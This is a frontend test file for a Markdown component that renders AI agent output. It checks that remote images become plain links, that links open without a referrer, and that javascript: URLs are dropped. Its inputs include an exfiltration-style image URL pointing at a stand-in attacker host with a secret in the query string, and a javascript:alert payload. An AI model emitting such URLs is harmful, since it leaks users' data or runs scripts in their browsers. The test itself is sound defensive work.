import { describe, expect, it } from "vitest";
import { render, screen } from "@testing-library/react";
import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("never loads a remote image from agent output, only offers it as a link", () => {
    const { container } = render(<Markdown content="![leak](https://evil.example/x?d=secret)" />);

    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: "[image: leak]" });
    expect(link).toHaveAttribute("href", "https://evil.example/x?d=secret");
  });

  it("opens links away from the app, without a referrer", () => {
    render(<Markdown content="[docs](https://example.com)" />);

    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("drops a javascript: URL", () => {
    render(<Markdown content="[click](javascript:alert(1))" />);

    expect(screen.getByText("click").getAttribute("href") ?? "").not.toContain("javascript");
  });
});
